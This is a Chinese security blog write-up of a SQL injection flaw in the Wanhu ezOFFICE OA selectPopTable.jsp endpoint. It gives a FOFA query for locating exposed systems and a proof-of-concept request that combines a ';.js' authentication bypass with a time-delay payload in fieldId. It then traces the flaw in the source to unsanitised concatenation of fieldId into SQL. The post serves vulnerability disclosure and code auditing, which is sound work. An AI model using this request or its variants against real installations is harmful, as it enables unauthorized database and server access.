---
title: "万户OA selectPopTable.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/defaultroot-ezOFFICE-selectPopTable-sqli.html
asset_dir: assets/万户oa-selectpoptable.jsp-sql注入漏洞
---

# 万户OA selectPopTable.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/1/14 08:12
- 1155浏览
- [0评论](#comment)
- 31分钟阅读

深入探索

database

数据库

万户网络

---

# 0x01 产品简介

万户OA [ezoffice](https://mrxn.net/tag/ezoffice "ezoffice") 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公[软件](#)产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。

SQL注入检测工具

# 0x02 漏洞概述

万户 ezOFFICE platform/custom/custom\_[database](#)/dropdownselect/selectPopTable.jsp 接口存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，未授权的攻击者可利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")获取数据库权限，深入利用可获取服务器权限。

# 0x03 复现环境

本地环境 OR FOFA：app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"

# 漏洞复现

```
GET /defaultroot/platform/custom/custom_database/dropdownselect/selectPopTable.jsp;.js?fieldId=1%3Bwaitfor%20delay%270%3A0%3A4%27 HTTP/1.1
Host: ezoffice.mrxn.net
```

成功延时 4 秒

代码安全审计

[[![万户OA selectPopTable.jsp SQL注入漏洞](images/img-001-d9bcad83e0c1.png)](https://mrxn.net/content/uploadfile/202501/be5a1736770468.png)](https://mrxn.net/content/uploadfile/202501/be5a1736770468.png)

# 漏洞分析

> 关于鉴权绕过，参考这篇文章：[万户 ezOFFICE ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)

platform/custom/custom\_database/dropdownselect/selectPopTable.jsp 主要业务逻辑代码如下，非常简单！

```
<%
String index = request.getParameter("index");
String fieldId = request.getParameter("fieldId");
String value = request.getParameter("value");
String selectType=request.getParameter("selectType")==null?"":request.getParameter("selectType").toString();
//System.out.println(value);
String[] _table = null;
if("more".equals(selectType)){
    selectType="#";

    if(value != null && !"".equals(value) && !"null".equals(value)){
        String[] _temp = value.split("\\]\\$\\[");
        _table = new String[_temp.length];
        for(int i=0; i<_temp.length; i++){
            if(i==0){
                _table[i] = _temp[i].substring(1) + "]";
            }else{
                _table[i] = "[" + _temp[i];
            }
            //System.out.println(_table[i]);
        }
    }

}else{
    selectType="$";

    if(value != null && !"".equals(value) && !"null".equals(value)){
        String[] _temp = value.split("\\]\\$\\[");
        _table = new String[_temp.length];
        for(int i=0; i<_temp.length; i++){
            if(i==0){
                _table[i] = _temp[i].substring(1) + "]";
            }else{
                _table[i] = "[" + _temp[i];
            }
            //System.out.println(_table[i]);
        }
    }
}

String[][] pryTableList = (String[][])request.getAttribute("pryTableList");

String inType = "0";
String ds = "";
String fieldvalue_filter = "";
String fieldvalue_sql = "";

String field_value = "";

String[][] ret = new UIBD().getFieldExtInfoByFieldId(fieldId);
inType = ret[0][0];
ds = ret[0][1];
if("1".equals(inType)){
    fieldvalue_sql = ret[0][2];
}else{
    fieldvalue_filter = ret[0][2];
}
field_value = request.getParameter("value");//ret[0][3];
%>
```

主要关注 这一行

漏洞扫描服务

```
String[][] ret = new UIBD().getFieldExtInfoByFieldId(fieldId);
```

跟进 UIBD `getFieldExtInfoByFieldId` 方法看下

```
public String[][] getFieldExtInfoByFieldId(String fieldId) {
        DbOpt dbopt = null;
        String[][] result = (String[][])null;
        String sql = "select field_intype, field_ds, field_sql, field_value, field_def_setting, field_show, field_desname, field_name from tfield where field_id=" + fieldId;

        try {
            dbopt = new DbOpt();
            result = dbopt.executeQueryToStrArr2(sql, 8);
```

又是一个明显直接拼接参数进SQL语句，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，还是这么朴实无华！

# 最后

其他万户OA 相关漏洞  
[万户 ezOFFICE selectAmountField.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-selectAmountField-sqli.html)  
[万户OA系列漏洞](https://mrxn.net/tag/ezoffice)

商务软件和生产力软件

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#ezOFFICE](https://mrxn.net/tag/ezOFFICE)

---

文章目录

- [1.0x01 产品简介](#toc-1-)
- [2.0x02 漏洞概述](#toc-2-)
- [3.0x03 复现环境](#toc-3-)
- [4.漏洞复现](#toc-4-)
- [5.漏洞分析](#toc-5-)
- [6.最后](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
